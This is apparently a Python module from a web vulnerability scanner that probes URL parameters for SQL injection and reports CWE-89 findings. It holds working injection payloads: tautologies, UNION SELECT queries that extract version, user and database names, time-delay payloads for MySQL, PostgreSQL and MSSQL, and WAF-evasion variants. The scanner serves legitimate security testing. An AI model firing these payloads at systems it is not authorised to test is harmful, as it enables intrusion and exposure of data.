"""
Advanced SQL Injection Scanner with Enhanced Detection
"""
import asyncio
import re
import time
from typing import List, Optional, Dict
from .base import BaseScanner, Vulnerability, Severity
from ..http.client import Response
from ..utils.payload_generator import PayloadGenerator, EncodedPayloadGenerator


class AdvancedSQLiScanner(BaseScanner):
    """Advanced SQL Injection scanner with comprehensive payload testing"""
    
    def __init__(self, http_client, engine=None):
        super().__init__(http_client, engine)
        self.name = "Advanced SQL Injection Scanner"
        self.payload_gen = PayloadGenerator()
        self.encoder = EncodedPayloadGenerator()
    
    async def scan(self, url: str, params: Optional[dict] = None, method: str = "GET", **kwargs) -> List[Vulnerability]:
        """Advanced SQL injection scan with multiple techniques"""
        vulnerabilities = []
        
        # Get baseline response
        try:
            if method.upper() == "GET":
                baseline = await self.http_client.get(url, params=params, timeout=10)
            else:
                baseline = await self.http_client.post(url, data=params, timeout=10)
        except:
            baseline = None
        
        # Extract parameters
        test_params = params or {}
        if not test_params:
            if "?" in url:
                query_string = url.split("?")[1].split("#")[0]
                for param in query_string.split("&"):
                    if "=" in param:
                        key, value = param.split("=", 1)
                        test_params[key] = value
        
        if not test_params:
            return vulnerabilities
        
        # Test each parameter with multiple techniques
        for param_name, param_value in test_params.items():
            # Test 1: Standard payloads
            vulns = await self._test_standard_payloads(url, param_name, param_value, method, baseline)
            vulnerabilities.extend(vulns)
            
            if vulns:
                continue  # Found vulnerability, skip other tests for this param
            
            # Test 2: Encoded payloads
            vulns = await self._test_encoded_payloads(url, param_name, param_value, method, baseline)
            vulnerabilities.extend(vulns)
            
            if vulns:
                continue
            
            # Test 3: WAF bypass payloads
            vulns = await self._test_waf_bypass(url, param_name, param_value, method, baseline)
            vulnerabilities.extend(vulns)
            
            if vulns:
                continue
            
            # Test 4: Database-specific payloads
            vulns = await self._test_db_specific(url, param_name, param_value, method, baseline)
            vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    async def _test_standard_payloads(
        self, url: str, param: str, value: str, method: str, baseline: Optional[Response]
    ) -> List[Vulnerability]:
        """Test with standard SQL injection payloads"""
        vulnerabilities = []
        
        payloads = self.payload_gen.generate_sqli_payloads()
        
        for payload in payloads[:30]:  # Test more payloads
            try:
                test_params = {param: payload}
                
                if method.upper() == "GET":
                    resp = await self.http_client.get(url, params=test_params, timeout=10)
                else:
                    resp = await self.http_client.post(url, data=test_params, timeout=10)
                
                # Check for SQL errors
                if self._check_sql_errors_advanced(resp.text):
                    vuln = self._create_vulnerability(
                        name="SQL Injection (Error-based)",
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload[:200],
                        description="SQL injection vulnerability detected via error messages",
                        evidence="SQL error messages found in response",
                        recommendation="Use parameterized queries and input validation",
                        cwe="CWE-89"
                    )
                    vulnerabilities.append(vuln)
                    break
                
                # Check for boolean-based
                if baseline and self._check_boolean_based(resp, baseline, payload):
                    vuln = self._create_vulnerability(
                        name="SQL Injection (Boolean-based Blind)",
                        severity=Severity.HIGH,
                        url=url,
                        parameter=param,
                        payload=payload[:200],
                        description="Boolean-based blind SQL injection detected",
                        evidence="Response differs significantly from baseline",
                        recommendation="Use parameterized queries and input validation",
                        cwe="CWE-89"
                    )
                    vulnerabilities.append(vuln)
                    break
                
            except:
                continue
        
        return vulnerabilities
    
    async def _test_encoded_payloads(
        self, url: str, param: str, value: str, method: str, baseline: Optional[Response]
    ) -> List[Vulnerability]:
        """Test with encoded payloads"""
        vulnerabilities = []
        
        base_payload = "' OR '1'='1"
        encoded_variants = self.encoder.generate_encoded_variants(base_payload)
        
        for payload in encoded_variants[:10]:
            try:
                test_params = {param: payload}
                
                if method.upper() == "GET":
                    resp = await self.http_client.get(url, params=test_params, timeout=10)
                else:
                    resp = await self.http_client.post(url, data=test_params, timeout=10)
                
                if self._check_sql_errors_advanced(resp.text):
                    vuln = self._create_vulnerability(
                        name="SQL Injection (Encoded Payload)",
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload[:200],
                        description="SQL injection with encoded payload detected",
                        evidence="SQL error with encoded payload",
                        recommendation="Use parameterized queries and input validation",
                        cwe="CWE-89"
                    )
                    vulnerabilities.append(vuln)
                    break
            except:
                continue
        
        return vulnerabilities
    
    async def _test_waf_bypass(
        self, url: str, param: str, value: str, method: str, baseline: Optional[Response]
    ) -> List[Vulnerability]:
        """Test WAF bypass techniques"""
        vulnerabilities = []
        
        base_payload = "' OR '1'='1"
        bypass_payloads = [
            base_payload.replace(" ", "/**/"),
            base_payload.replace(" ", "+"),
            base_payload.replace(" ", "%20"),
            base_payload.replace(" ", "%09"),
            base_payload.replace("OR", "Or"),
            base_payload.replace("OR", "oR"),
            base_payload.replace("OR", "Or"),
            base_payload.replace("'", "''"),
            base_payload.replace("'", "\\'"),
        ]
        
        for payload in bypass_payloads:
            try:
                test_params = {param: payload}
                
                if method.upper() == "GET":
                    resp = await self.http_client.get(url, params=test_params, timeout=10)
                else:
                    resp = await self.http_client.post(url, data=test_params, timeout=10)
                
                if self._check_sql_errors_advanced(resp.text):
                    vuln = self._create_vulnerability(
                        name="SQL Injection (WAF Bypass)",
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload[:200],
                        description="SQL injection with WAF bypass technique detected",
                        evidence="SQL error with WAF bypass payload",
                        recommendation="Use parameterized queries and input validation",
                        cwe="CWE-89"
                    )
                    vulnerabilities.append(vuln)
                    break
            except:
                continue
        
        return vulnerabilities
    
    async def _test_db_specific(
        self, url: str, param: str, value: str, method: str, baseline: Optional[Response]
    ) -> List[Vulnerability]:
        """Test database-specific payloads"""
        vulnerabilities = []
        
        # MySQL specific
        mysql_payloads = [
            "' UNION SELECT @@version--",
            "' UNION SELECT user()--",
            "' UNION SELECT database()--",
            "'; SELECT SLEEP(5)--",
        ]
        
        # PostgreSQL specific
        postgres_payloads = [
            "' UNION SELECT version()--",
            "' UNION SELECT current_user--",
            "'; SELECT pg_sleep(5)--",
        ]
        
        # MSSQL specific
        mssql_payloads = [
            "' UNION SELECT @@version--",
            "'; WAITFOR DELAY '0:0:5'--",
        ]
        
        all_payloads = mysql_payloads + postgres_payloads + mssql_payloads
        
        for payload in all_payloads:
            try:
                test_params = {param: payload}
                
                if method.upper() == "GET":
                    resp = await self.http_client.get(url, params=test_params, timeout=15)
                else:
                    resp = await self.http_client.post(url, data=test_params, timeout=15)
                
                if self._check_sql_errors_advanced(resp.text):
                    dbms = self._detect_dbms(resp.text)
                    vuln = self._create_vulnerability(
                        name=f"SQL Injection ({dbms})",
                        severity=Severity.CRITICAL,
                        url=url,
                        parameter=param,
                        payload=payload[:200],
                        description=f"SQL injection detected on {dbms} database",
                        evidence=f"SQL error from {dbms}",
                        recommendation="Use parameterized queries and input validation",
                        cwe="CWE-89"
                    )
                    vulnerabilities.append(vuln)
                    break
            except:
                continue
        
        return vulnerabilities
    
    def _check_sql_errors_advanced(self, text: str) -> bool:
        """Advanced SQL error detection"""
        error_patterns = [
            r"sql syntax.*mysql",
            r"warning.*mysql",
            r"you have an error in your sql syntax",
            r"mysql_fetch",
            r"mysql_num_rows",
            r"postgresql.*error",
            r"pg_query",
            r"mssql.*error",
            r"microsoft sql server",
            r"ora-\d{5}",
            r"oracle.*error",
            r"sqlite.*error",
            r"quoted string not properly terminated",
            r"unclosed quotation mark",
            r"sql.*exception",
            r"sql.*warning",
        ]
        
        text_lower = text.lower()
        for pattern in error_patterns:
            if re.search(pattern, text_lower, re.IGNORECASE):
                return True
        
        return False
    
    def _check_boolean_based(self, resp: Response, baseline: Response, payload: str) -> bool:
        """Check for boolean-based SQL injection"""
        length_diff = abs(len(resp.content) - len(baseline.content))
        
        if length_diff > 200:
            # Check for SQL keywords
            sql_keywords = ["select", "from", "where", "union", "order by"]
            response_lower = resp.text.lower()
            baseline_lower = baseline.text.lower()
            
            keyword_count = sum(1 for kw in sql_keywords if kw in response_lower and kw not in baseline_lower)
            return keyword_count >= 2
        
        return False
    
    def _detect_dbms(self, text: str) -> str:
        """Detect database management system"""
        text_lower = text.lower()
        
        if "mysql" in text_lower or "mariadb" in text_lower:
            return "MySQL"
        elif "postgresql" in text_lower or "postgres" in text_lower:
            return "PostgreSQL"
        elif "mssql" in text_lower or "sql server" in text_lower:
            return "MSSQL"
        elif "oracle" in text_lower or "ora-" in text_lower:
            return "Oracle"
        elif "sqlite" in text_lower:
            return "SQLite"
        
        return "Unknown"

